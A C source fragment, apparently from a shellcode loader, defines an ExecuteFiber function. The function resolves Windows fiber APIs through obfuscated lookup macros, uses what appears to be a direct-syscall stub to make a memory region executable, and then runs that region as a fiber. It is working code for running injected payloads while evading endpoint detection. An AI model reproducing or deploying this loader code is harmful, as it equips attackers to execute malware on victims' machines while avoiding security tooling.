#ifdef EXECUTE_FIBER
BOOL ExecuteFiber(PVOID addr, DWORD64 sizeofaddr)
{
	pConvertThreadToFiber myConvertThreadToFiber = (pConvertThreadToFiber)_GET_PROC_ADDRESS(_GET_MODULE_HANDLE(_Kernel32), _ConvertThreadToFiber);

	if (myConvertThreadToFiber == NULL)
	{
		return FALSE;
	}
	 
	pCreateFiber myCreateFiber = (pCreateFiber)_GET_PROC_ADDRESS(_GET_MODULE_HANDLE(_Kernel32), _CreateFiber);

	if (myCreateFiber == NULL)
	{
		return FALSE;
	}

	pSwitchToFiber mySwitchToFiber = (pSwitchToFiber)_GET_PROC_ADDRESS(_GET_MODULE_HANDLE(_Kernel32), _SwitchToFiber);

	if (mySwitchToFiber == NULL)
	{
		return FALSE;
	}

	NTSTATUS ntstatus;
	SIZE_T RegionSize = sizeofaddr;
	DWORD OldProtect = 0;
	ntstatus = SysNtProtectVirtualMemory(NtCurrentProcess(), &addr, &RegionSize, PAGE_EXECUTE_READ, &OldProtect);

	if (ntstatus != STATUS_SUCCESS)
	{
		return FALSE;
	}

	myConvertThreadToFiber(NULL);
	LPVOID lpFiber = myCreateFiber(sizeofaddr, (LPFIBER_START_ROUTINE)addr, NULL);
	mySwitchToFiber(lpFiber);
	return TRUE;
}
#endif

